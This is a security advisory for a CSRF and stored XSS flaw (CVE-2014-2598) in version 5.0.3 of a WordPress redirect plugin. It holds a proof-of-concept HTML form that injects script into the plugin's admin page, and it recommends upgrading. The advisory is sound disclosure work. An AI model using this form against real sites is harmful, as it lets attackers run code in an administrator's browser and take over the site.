Software: Quick Page/Post Redirect Plugin
Version: 5.0.3
Homepage: http://wordpress.org/plugins/quick-pagepost-redirect-plugin/
Advisory ID: dxw-1970-1091
CVE: CVE-2014-2598
CVSS: 6.8 (Medium; AV:N/AC:M/Au:N/C:P/I:P/A:P)

Description
================
CSRF and stored XSS in Quick Page/Post Redirect Plugin

Vulnerability
================
This plugin is vulnerable to a combination CSRF/XSS attack meaning that if an admin user can be persuaded to visit a URL of the attacker’s choosing (via spear phishing for instance), the attacker can insert arbitrary JavaScript into an admin page. Once that occurs the admin’s browser can be made to do almost anything the admin user could typically do such as create/delete posts, create new admin users, or even exploit vulnerabilities in other plugins.

Proof of concept
================
Use the following form to introduce potentially malicious JavaScript:
<form method=\"POST\" action=\"http://localhost/wp-admin/admin.php?page=redirect-updates\">
  <input type=\"text\" name=\"quickppr_redirects[request][]\" value=\""><script>alert(1)</script>\">
  <input type=\"text\" name=\"quickppr_redirects[destination][]\" value=\"http://dxw.com/\">
  <Input type=\"text\" name=\"submit_301\" value=\"1\">
  <input type=\"submit\">
</form>

Mitigations
================
Upgrade to version 5.0.5 or later.
